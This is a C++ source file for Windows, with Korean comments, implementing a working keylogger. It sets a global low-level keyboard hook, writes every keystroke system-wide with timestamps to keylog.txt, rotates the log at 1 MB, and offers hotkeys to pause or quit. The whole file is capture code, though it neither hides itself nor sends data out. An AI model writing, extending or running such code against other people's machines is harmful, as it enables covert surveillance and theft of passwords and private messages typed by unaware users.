#include <windows.h>
#include <fstream>
#include <ctime>
#include <string>
#include <codecvt>
#include <locale>

#define STR "keylog.txt"
#define LG std::ofstream

HHOOK hHook;
bool isLoggingEnabled = true;
const size_t MAX_FILE_SIZE = 1024 * 1024;
std::time_t lastTimestamp = 0;  // 마지막으로 타임스탬프를 기록한 시간

// std::wstring을 std::string으로 변환하는 함수
std::string wstringToString(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
    return converter.to_bytes(wstr);
}

// 현재 시간 정보를 문자열로 변환하여 반환
std::string GetTimestamp() {
    std::time_t now = std::time(nullptr);
    std::tm localTime;
    localtime_s(&localTime, &now);

    char buffer[80];
    strftime(buffer, sizeof(buffer), "[%Y-%m-%d %H:%M:%S] ", &localTime);
    return buffer;
}

// 가상 키 코드를 문자열로 변환하는 함수
std::string GetKeyName(DWORD vkCode) {
    BYTE keyboardState[256];
    WCHAR buffer[5];

    if (GetKeyboardState(keyboardState)) {
        HKL layout = GetKeyboardLayout(0);
        int result = ToUnicodeEx(vkCode, MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout),
            keyboardState, buffer, 5, 0, layout);

        if (result > 0) {
            return wstringToString(std::wstring(buffer, result));
        }
    }

    switch (vkCode) {
    case VK_RETURN: return "[Enter]";
    case VK_BACK: return "[Backspace]";
    case VK_TAB: return "[Tab]";
    case VK_SHIFT: return "[Shift]";
    case VK_CONTROL: return "[Ctrl]";
    case VK_MENU: return "[Alt]";
    case VK_CAPITAL: return "[Caps Lock]";
    case VK_ESCAPE: return "[Esc]";
    case VK_SPACE: return " ";
    default: return "[Unknown Key]";
    }
}

// 로그 파일 크기 확인 및 파일 분할
void CheckLogFileSize() {
    std::ifstream file(STR, std::ios::binary | std::ios::ate);
    if (file.is_open() && file.tellg() >= MAX_FILE_SIZE) {
        file.close();
        std::time_t now = std::time(nullptr);
        std::tm localTime;
        localtime_s(&localTime, &now);

        char buffer[80];
        strftime(buffer, sizeof(buffer), "keylog_%Y%m%d_%H%M%S.txt", &localTime);
        rename(STR, buffer);
    }
}

// 훅 프로시저 (키 입력을 가로채서 파일에 기록)
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && isLoggingEnabled) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) {
            CheckLogFileSize();
            LG log(STR, std::ios::app);
            if (log.is_open()) {
                // 마지막 기록한 타임스탬프로부터 5초가 지났는지 확인
                std::time_t now = std::time(nullptr);
                if (now - lastTimestamp >= 5) {
                    log << GetTimestamp();
                    lastTimestamp = now;
                }
                log << GetKeyName(pKeyboard->vkCode) << std::endl;
                log.close();
            }
        }
    }
    // Ctrl + Shift + Q: 종료, Ctrl + Shift + L: 로깅 토글
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000 &&
        GetAsyncKeyState(VK_SHIFT) & 0x8000) {
        if (GetAsyncKeyState(0x51) & 0x8000) PostQuitMessage(0);
        if (GetAsyncKeyState(0x4C) & 0x8000) isLoggingEnabled = !isLoggingEnabled;
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) return 1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
